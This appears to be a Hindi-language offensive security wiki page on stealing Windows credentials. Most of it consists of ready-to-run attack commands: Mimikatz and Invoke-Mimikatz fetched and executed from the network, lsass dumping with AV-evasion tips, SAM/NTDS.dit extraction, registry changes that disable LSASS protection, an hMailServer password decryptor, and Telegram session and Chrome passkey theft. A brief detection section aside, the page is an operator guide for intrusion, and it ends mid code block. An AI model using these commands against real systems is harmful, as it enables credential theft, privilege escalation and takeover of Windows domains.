# Windows क्रेडेंशियल्स चुराना

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz क्रेडेंशियल्स

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Mimikatz और क्या-क्या कर सकता है, यह** [**इस पेज पर**](credentials-mimikatz.md)** देखें।**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**यहाँ कुछ संभावित क्रेडेंशियल सुरक्षा उपायों के बारे में जानें।**](credentials-protections.md) **ये सुरक्षा उपाय Mimikatz को कुछ क्रेडेंशियल निकालने से रोक सकते हैं।**

## Meterpreter के साथ क्रेडेंशियल्स

पीड़ित के सिस्टम में **पासवर्ड और hashes खोजने** के लिए मेरे बनाए [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) का उपयोग करें।

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## AV को bypass करना

### Procdump + Mimikatz

**[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)** का Procdump एक वैध Microsoft टूल है**, इसलिए Defender इसे detect नहीं करता।\
इस टूल से आप **lsass process का dump बना सकते हैं**, **dump download कर सकते हैं** और dump से **credentials को locally extract कर सकते हैं**।

आप [SharpDump](https://github.com/GhostPack/SharpDump) का भी उपयोग कर सकते हैं।

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

यह प्रक्रिया [SprayKatz](https://github.com/aas-n/spraykatz) से स्वचालित रूप से की जाती है: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**ध्यान दें**: कुछ **AV**, **lsass.exe को dump करने के लिए procdump.exe के इस्तेमाल** को **malicious** के रूप में **detect** कर सकते हैं। ऐसा इसलिए है क्योंकि वे **"procdump.exe" और "lsass.exe"** strings को **detect** कर रहे होते हैं। इसलिए, **lsass.exe के नाम के बजाय**, procdump को **argument** के रूप में lsass.exe का **PID** देना ज़्यादा **stealthy** होता है।

### **comsvcs.dll** से lsass dump करना

`C:\Windows\System32` में मौजूद **comsvcs.dll** नाम की DLL, crash होने की स्थिति में **process memory dump करने** के लिए ज़िम्मेदार होती है। इस DLL में **`MiniDumpW`** नाम का एक **function** शामिल है, जिसे `rundll32.exe` का उपयोग करके invoke करने के लिए बनाया गया है।\
पहले दो arguments का उपयोग करना अप्रासंगिक है, लेकिन तीसरा argument तीन हिस्सों में बँटा होता है। Dump किए जाने वाले process की ID पहला हिस्सा होती है, dump file की location दूसरा, और तीसरा हिस्सा केवल **full** शब्द होता है। इसके कोई वैकल्पिक विकल्प नहीं हैं।\
इन तीनों हिस्सों को parse करने के बाद, DLL dump file बनाती है और निर्दिष्ट process की memory को इस file में स्थानांतरित करती है।\
**comsvcs.dll** का उपयोग lsass process को dump करने के लिए किया जा सकता है, जिससे procdump को upload और execute करने की ज़रूरत नहीं पड़ती। इस method का विवरण [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) पर दिया गया है।<sup>[[9]](#references)</sup>

निष्पादन के लिए निम्नलिखित command का उपयोग किया जाता है:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**आप इस प्रक्रिया को** [**lssasy**](https://github.com/Hackndo/lsassy)** से automate कर सकते हैं।**

### **Task Manager से lsass dump करना**

1. Task Bar पर right click करें और Task Manager पर click करें
2. More details पर click करें
3. Processes tab में "Local Security Authority Process" process खोजें
4. "Local Security Authority Process" process पर right click करें और "Create dump file" पर click करें।

### procdump से lsass dump करना

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) Microsoft द्वारा signed binary है, जो [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite का हिस्सा है।

पहले से मौजूद full-system crash dump या किसी सुलभ user folder में उसकी compressed copy में offline analysis के लिए credential material मौजूद हो सकता है। `MEMORY.DMP` और `MEMORY.7z` जैसे filenames केवल जाँच के संकेत हैं: provenance और access की पुष्टि करें, और यह न मानें कि उनमें उपयोगी या मौजूदा credentials हैं।

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## PPLBlade के साथ lsass को Dump करना

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) एक Protected Process Dumper Tool है, जो memory dump को obfuscate करने और उसे disk पर डाले बिना remote workstations पर transfer करने का समर्थन करता है।

**मुख्य कार्यक्षमताएँ**:

1. PPL protection को bypass करना
2. Defender के signature-based detection mechanisms से बचने के लिए memory dump files को obfuscate करना
3. RAW और SMB upload methods का उपयोग करके memory dump को disk पर डाले बिना upload करना (fileless dump)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – MiniDumpWriteDump के बिना SSP-आधारित LSASS dumping

Ink Dragon, **LalsDumper** नाम का तीन-चरणों वाला dumper इस्तेमाल करता है। यह कभी `MiniDumpWriteDump` को कॉल नहीं करता, इसलिए उस API पर EDR hooks कभी सक्रिय नहीं होते:<sup>[[3]](#references)</sup>

1. **चरण 1 loader (`lals.exe`)** – `fdp.dll` में 32 छोटे अक्षर `d` वाले placeholder को खोजता है, उसे `rtu.txt` के absolute path से बदलता है, patched DLL को `nfdp.dll` के रूप में सेव करता है और `AddSecurityPackageA("nfdp","fdp")` कॉल करता है। इससे **LSASS** malicious DLL को नए Security Support Provider (SSP) के रूप में load करता है।
2. **LSASS के अंदर चरण 2** – जब LSASS `nfdp.dll` load करता है, तो DLL `rtu.txt` पढ़ता है, हर byte को `0x20` से XOR करता है और execution सौंपने से पहले decoded blob को memory में map करता है।
3. **चरण 3 dumper** – mapped payload, hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`) से resolved **direct syscalls** का उपयोग करके MiniDump logic को फिर से लागू करता है। `Tom` नाम का एक dedicated export `%TEMP%\<pid>.ddt` खोलता है, compressed LSASS dump को file में लिखता है और handle बंद कर देता है, ताकि बाद में exfiltration किया जा सके।

ऑपरेटर के लिए नोट्स:

* `lals.exe`, `fdp.dll`, `nfdp.dll` और `rtu.txt` को एक ही directory में रखें। चरण 1, hard-coded placeholder को `rtu.txt` के absolute path से बदलता है, इसलिए इन्हें अलग-अलग रखने से chain टूट जाती है।
* Registration, `nfdp` को `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` में जोड़कर होता है। LSASS से हर boot पर SSP reload करवाने के लिए आप खुद यह value सेट कर सकते हैं।
* `%TEMP%\*.ddt` files compressed dumps होती हैं। इन्हें स्थानीय रूप से decompress करें, फिर credentials extraction के लिए Mimikatz/Volatility को दें।
* `lals.exe` चलाने के लिए admin/SeTcb rights आवश्यक हैं, ताकि `AddSecurityPackageA` सफल हो सके; call के लौटते ही, LSASS rogue SSP को transparently load करके चरण 2 execute करता है।
* DLL को disk से हटाने पर वह LSASS से unload नहीं होता। या तो registry entry delete करके LSASS को restart करें (reboot), या इसे long-term persistence के लिए रहने दें।

## CrackMapExec

### Dump SAM hashes

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### LSA secrets को Dump करें

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### लक्षित DC से NTDS.dit डंप करें

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Target DC से NTDS.dit password history dump करें

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### प्रत्येक NTDS.dit अकाउंट के लिए pwdLastSet attribute दिखाएँ

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## SAM और SYSTEM चुराना

ये फ़ाइलें _C:\windows\system32\config\SAM_ और _C:\windows\system32\config\SYSTEM_ में **स्थित** होनी चाहिए। लेकिन आप इन्हें सामान्य तरीके से कॉपी नहीं कर सकते, क्योंकि ये सुरक्षित हैं।

### Registry से

इन फ़ाइलों को चुराने का सबसे आसान तरीका Registry से उनकी कॉपी प्राप्त करना है:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**उन फ़ाइलों को** अपनी Kali मशीन पर **डाउनलोड** करें और hashes निकालने के लिए इसका उपयोग करें:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

आप इस service का उपयोग करके protected files की copy बना सकते हैं। इसके लिए Administrator होना आवश्यक है।

#### Using vssadmin

vssadmin binary केवल Windows Server versions में उपलब्ध है.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

लेकिन आप यही काम **Powershell** से भी कर सकते हैं। यह **SAM file कॉपी करने** का एक उदाहरण है (यहाँ इस्तेमाल की गई हार्ड ड्राइव "C:" है और इसे C:\users\Public में सेव किया गया है), लेकिन आप इसका इस्तेमाल किसी भी संरक्षित file को कॉपी करने के लिए कर सकते हैं:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

पुस्तक का कोड: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

अंत में, SAM, SYSTEM और ntds.dit की कॉपी बनाने के लिए आप [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) का भी उपयोग कर सकते हैं।

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** फ़ाइल को **Active Directory** का केंद्र माना जाता है। इसमें user objects, groups और उनकी memberships के बारे में महत्वपूर्ण डेटा होता है। इसी में domain users के **password hashes** स्टोर किए जाते हैं। यह फ़ाइल **Extensible Storage Engine (ESE)** database है और **_%SystemRoom%/NTDS/ntds.dit_** पर मौजूद होती है।

इस database में तीन मुख्य tables होती हैं:

- **Data Table**: यह users और groups जैसे objects की जानकारी स्टोर करती है।
- **Link Table**: यह relationships, जैसे group memberships, का हिसाब रखती है।
- **SD Table**: हर object के **security descriptors** यहाँ रखे जाते हैं, जिससे स्टोर किए गए objects की सुरक्षा और access control सुनिश्चित होता है।

Christoffer Andersson का database-layer research इन tables और उनके version-specific behavior का अधिक विस्तार से दस्तावेज़ीकरण करता है।<sup>[[8]](#references)</sup>

Windows इस फ़ाइल के साथ काम करने के लिए _Ntdsa.dll_ का उपयोग करता है और इसका उपयोग _lsass.exe_ करता है। इसलिए, **NTDS.dit** फ़ाइल का **कुछ हिस्सा `lsass`** memory में मौजूद हो सकता है (संभवतः performance बेहतर करने के लिए **cache** का उपयोग किए जाने के कारण, आप वहाँ हाल ही में access किया गया डेटा पा सकते हैं)।

#### NTDS.dit के अंदर hashes को decrypt करना

Hash को तीन बार encrypt किया जाता है:

1. **BOOTKEY** और **RC4** का उपयोग करके Password Encryption Key (**PEK**) को decrypt करें।
2. **PEK** और **RC4** का उपयोग करके **hash** को decrypt करें।
3. **DES** का उपयोग करके **hash** को decrypt करें।

**PEK** का मान हर domain controller पर **समान** होता है, लेकिन वह उस domain controller के **SYSTEM** hive के DC-specific **BOOTKEY** से **encrypted** होकर **NTDS.dit** के अंदर रहता है। इसलिए, credentials निकालने के लिए **NTDS.dit** और **SYSTEM** (`C:\Windows\System32\config\SYSTEM`) दोनों की आवश्यकता होती है।

### Ntdsutil का उपयोग करके NTDS.dit की कॉपी बनाना

Windows Server 2008 से उपलब्ध।

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

आप **ntds.dit** फ़ाइल कॉपी करने के लिए [**volume shadow copy**](#stealing-sam-and-system) trick का भी इस्तेमाल कर सकते हैं। याद रखें कि आपको **SYSTEM file** की एक कॉपी भी चाहिए होगी (इसे [**registry से dump करें या volume shadow copy**](#stealing-sam-and-system) trick का इस्तेमाल करें)।

### **NTDS.dit से hashes निकालना**

**NTDS.dit** और **SYSTEM** फ़ाइलें **प्राप्त** करने के बाद, आप hashes **निकालने** के लिए _secretsdump.py_ जैसे tools का इस्तेमाल कर सकते हैं:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

आप इन्हें वैध domain admin user का उपयोग करके **स्वचालित रूप से extract** भी कर सकते हैं:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

बड़ी **NTDS.dit files** के लिए, उन्हें [gosecretsdump](https://github.com/c-sto/gosecretsdump) का उपयोग करके extract करने की सलाह दी जाती है।

अंत में, आप **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ या **mimikatz** `lsadump::lsa /inject` का भी उपयोग कर सकते हैं।

### **NTDS.dit से domain objects को SQLite database में extract करना**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) से NTDS objects को SQLite database में extract किया जा सकता है। केवल secrets ही नहीं, बल्कि आगे की जानकारी extract करने के लिए संपूर्ण objects और उनके attributes भी extract किए जाते हैं, जब raw NTDS.dit file पहले ही प्राप्त की जा चुकी हो।

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

`SYSTEM` hive वैकल्पिक है, लेकिन secrets decryption (NT & LM hashes, supplemental credentials जैसे cleartext passwords, kerberos या trust keys, NT & LM password histories) की अनुमति देता है। अन्य जानकारी के साथ, निम्नलिखित data निकाला जाता है: user और machine accounts के hashes, UAC flags, last logon और password change के timestamps, accounts के descriptions, names, UPN, SPN, groups और recursive memberships, organizational units का tree और membership, तथा trusts के type, direction और attributes सहित trusted domains...

## Lazagne

[यहाँ](https://github.com/AlessandroZ/LaZagne/releases) से binary download करें। आप इस binary का इस्तेमाल कई software से credentials निकालने के लिए कर सकते हैं।

```
lazagne.exe all
```

## SAM और LSASS से credentials निकालने के अन्य tools

### Windows credentials Editor (WCE)

इस tool का उपयोग memory से credentials निकालने के लिए किया जा सकता है। इसे यहाँ से download करें: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM file से credentials निकालें

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

SAM file से credentials निकालें

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

इसे यहाँ से डाउनलोड करें:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) और बस इसे **चलाएँ**; पासवर्ड निकाल लिए जाएँगे।

## निष्क्रिय RDP sessions से डेटा जुटाना और security controls को कमजोर करना

Ink Dragon के FinalDraft RAT में `DumpRDPHistory` tasker शामिल है, जिसकी techniques किसी भी red-teamer के काम आ सकती हैं:<sup>[[3]](#references)</sup>

### DumpRDPHistory-शैली में telemetry संग्रह

* **आउटबाउंड RDP targets** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` पर मौजूद हर user hive को parse करें। हर subkey में server का नाम, `UsernameHint` और आखिरी बार लिखे जाने का timestamp होता है। आप PowerShell से FinalDraft के logic को दोहरा सकते हैं:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **आने वाले RDP के साक्ष्य** – यह पता लगाने के लिए कि सिस्टम को किसने प्रशासित किया, `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` लॉग में Event IDs **21** (सफल लॉगऑन) और **25** (डिस्कनेक्ट) के लिए क्वेरी करें:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

जब आपको पता चल जाए कि कौन-सा Domain Admin नियमित रूप से कनेक्ट होता है, तो उनका **डिस्कनेक्टेड** session मौजूद रहते हुए LSASS dump करें (LalsDumper/Mimikatz के साथ)। CredSSP + NTLM fallback उनके verifier और tokens को LSASS में छोड़ देता है, जिन्हें फिर SMB/WinRM पर replay करके `NTDS.dit` हासिल किया जा सकता है या domain controllers पर persistence स्थापित की जा सकती है।

### FinalDraft द्वारा लक्षित Registry downgrades

वही implant credential theft को आसान बनाने के लिए कई registry keys के साथ भी छेड़छाड़ करता है:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` सेट करने से RDP के दौरान पूरे credentials/ticket का पुनः उपयोग बाध्य होता है, जिससे pass-the-hash शैली के pivots संभव होते हैं।
* `LocalAccountTokenFilterPolicy=1` UAC token filtering को अक्षम करता है, ताकि local admins को नेटवर्क पर unrestricted tokens मिलें।
* `DSRMAdminLogonBehavior=2` DSRM administrator को DC ऑनलाइन होने पर लॉग ऑन करने देता है, जिससे attackers को एक और built-in high-privilege account मिलता है।
* `RunAsPPL=0` LSASS PPL सुरक्षा हटाता है, जिससे LalsDumper जैसे dumpers के लिए memory access आसान हो जाता है।

## hMailServer कॉन्फ़िगरेशन credentials (post-compromise)

इंस्टॉलेशन लेआउट के अनुसार, सटीक configuration files `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, और `C:\ProgramData\hMailServer\hMailServer.ini` जाँचें। पढ़ने योग्य, nonempty `[Security] AdministratorPassword=` value, hMailServer administration password hash होती है; यह Windows Administrator password का प्रमाण नहीं है। यदि यह credential प्राप्त हो जाए, तो Windows-account pivot के लिए password reuse और logon rights की स्वतंत्र रूप से पुष्टि करना आवश्यक है।

SQL CE database का उपयोग करने वाले installations में, INI की अलग `[Database] Password=` value database को सुरक्षित रखती है। Legacy installations में यह value static key `THIS_KEY_IS_NOT_SECRET` और 4-byte word endianness swaps के साथ Blowfish-encrypted होती है। INI से hex string लेकर यह Python snippet इस्तेमाल करें:<sup>[[2]](#references)</sup>

पहले पुष्टि करें कि मौजूदा account INI और संबंधित SQL CE `.sdf` database, **दोनों** को पढ़ सकता है। INI password database को सुरक्षित रखता है; यह उसके भीतर stored mailbox account hashes से अलग है। उपयोग में चल रहे database की जाँच या upgrade उसकी **copy** पर करें, live file पर कभी नहीं।

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Clear-text password मिलने पर, file locks से बचने के लिए SQL CE database की copy बनाएं, 32-bit provider load करें, और hashes query करने से पहले ज़रूरत पड़ने पर upgrade करें:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

`accountpassword` कॉलम hMailServer hash फ़ॉर्मैट (hashcat mode `1421`) का उपयोग करता है। क्रैक किया गया mailbox password, Windows user तक pivot तभी बनता है जब वही password किसी local/domain account द्वारा दोबारा इस्तेमाल किया गया हो और उस account के पास आवश्यक remote-logon rights हों।

## LSA Logon Callback Interception (LsaApLogonUserEx2)

कुछ tooling, LSA logon callback `LsaApLogonUserEx2` को intercept करके **plaintext logon passwords** कैप्चर करती है। इसका विचार authentication package callback को hook या wrap करना है, ताकि credentials **logon के दौरान** (hashing से पहले) कैप्चर किए जाएँ और फिर disk पर लिखे जाएँ या operator को लौटाए जाएँ। इसे आम तौर पर ऐसे helper के रूप में implement किया जाता है जो LSA में inject या उसके साथ register होता है, और फिर हर सफल interactive/network logon event के username, domain और password को रिकॉर्ड करता है।<sup>[[1]](#references)</sup>

Operational notes:
- Authentication path में helper लोड करने के लिए local admin/SYSTEM आवश्यक है।
- Captured credentials केवल logon होने पर दिखाई देते हैं (hook के आधार पर interactive, RDP, service या network logon)।

## SSMS में सहेजे गए Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS), सहेजी गई connection जानकारी को प्रति-user `sqlstudio.bin` फ़ाइल में रखता है। Dedicated dumpers, फ़ाइल को parse करके सहेजे गए SQL credentials रिकवर कर सकते हैं। ऐसे shells में जो केवल command output लौटाते हैं, फ़ाइल को अक्सर Base64 में encode करके stdout पर print कर exfiltrate किया जाता है।<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

ऑपरेटर की ओर, credentials पुनर्प्राप्त करने के लिए फ़ाइल को फिर से build करें और dumper को स्थानीय रूप से चलाएँ:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Chrome DevTools Protocol के ज़रिए browser session और cookie चोरी

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Telegram Desktop `tdata` session चोरी

Telegram Desktop authorization और account state को अपनी **`tdata`** directory में रखता है। कॉपी किए गए session को compatible tooling से लोड करके account password के बिना authenticate किया जा सकता है, जब तक वह authorization मान्य हो; अगर local-data encryption enabled है, तो stealer को passcode की भी ज़रूरत होती है। इसके बाद authenticated session से identity data, dialog और membership metadata, messages और डाउनलोड करने योग्य media तक पहुँचा जा सकता है।<sup>[[10]](#references)</sup>

### खोज और प्राप्ति

Installed और portable, दोनों layouts में खोजें; Microsoft Store package names अलग-अलग हो सकते हैं, इसलिए `TelegramMessenge` वाली package directories की सूची बनाएँ और उनकी `LocalCache\Roaming` subtree देखें।<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

यदि सामान्य reads विफल हों और process token में `SeBackupPrivilege` **पहले से मौजूद और enabled** हो, तो backup-aware access एक fallback प्रदान करता है; यह privilege प्राप्त नहीं करता और न ही process को elevate करता है। आवश्यक token privileges मौजूद होने पर `FILE_FLAG_BACKUP_SEMANTICS` के साथ `CreateFileW` backup/restore semantics का अनुरोध कर सकता है और file security checks को override कर सकता है, लेकिन केवल यह flag किसी असंगत sharing lock को नहीं हटाता।<sup>[[10]](#references)[[11]](#references)</sup>

Live locked files के लिए **Volume Shadow Copy** बनाएँ/पढ़ें; ACL-blocked files के लिए, `robocopy /B` backup mode का उपयोग करता है और file तथा directory ACLs को override करता है।<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

एक bandwidth-conscious implant पहले केवल file-path inventory सबमिट कर सकता है, फिर snapshot identifier और C2 में पहले से stored paths प्राप्त करके केवल missing files अपलोड कर सकता है। इसलिए, recursive `tdata` enumeration के बाद छोटे incremental transfers भी सफल session theft का संकेत हो सकते हैं।<sup>[[10]](#references)</sup>

### Detection और containment

किसी non-Telegram process द्वारा `tdata` तक recursive access को `SeBackupPrivilege` enablement, backup-semantics file opens, VSS activity, या `/B` का उपयोग करने वाले child `robocopy.exe` के साथ correlate करें। `%APPDATA%` और `%LOCALAPPDATA%\Packages` की तेज़ी से होने वाली enumeration के बाद उसी process से होने वाले outbound connections की भी तलाश करें। Compromise के बाद, अपरिचित sessions समाप्त करने के लिए **Settings → Devices** (या **Privacy & Security → Active Sessions**) का उपयोग करें; केवल two-step verification enable करने से पहले से चुराई गई authorization रद्द नहीं होती।<sup>[[10]](#references)[[13]](#references)</sup>

## Windows पर Chrome से Passkeys / WebAuthn credential theft

अगर **Chrome + Google Password Manager synced passkeys** का उपयोग करने वाले Windows host पर **victim user** के रूप में code execution मिल जाता है, तो passkeys एक दिलचस्प post-exploitation target बन जाते हैं—**admin/SYSTEM** के बिना भी।<sup>[[4]](#references)</sup>

### दिलचस्प local artifacts

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** में protobuf-encoded **`WebauthnCredentialSpecifics`** रिकॉर्ड संग्रहीत होते हैं। उसी user के process से synced passkeys का **RP ID**, **username**, **credential ID** और encrypted private-key material enumerate किया जा सकता है।<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** में local device-enrollment state संग्रहीत होती है, जैसे **`wrapped_identity_private_key`** और synced credentials रिकवर करने के लिए उपयोग किया जाने वाला wrapped secret।<sup>[[4]](#references)</sup>

त्वरित जाँच:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-bound key blobs का अब भी local signing oracle के रूप में दुरुपयोग किया जा सकता है

अगर browser TPM-backed identity key को **`NCRYPT_OPAQUE_KEY_BLOB`** के रूप में export करता है और उस blob को user-accessible state में store करता है, तो malware को raw private key निकालने की ज़रूरत नहीं होती। वह बस उसी machine पर blob को फिर से import करके local TPM से attacker-controlled data पर sign करने के लिए कह सकता है:<sup>[[4]](#references)[[6]](#references)</sup>

```c
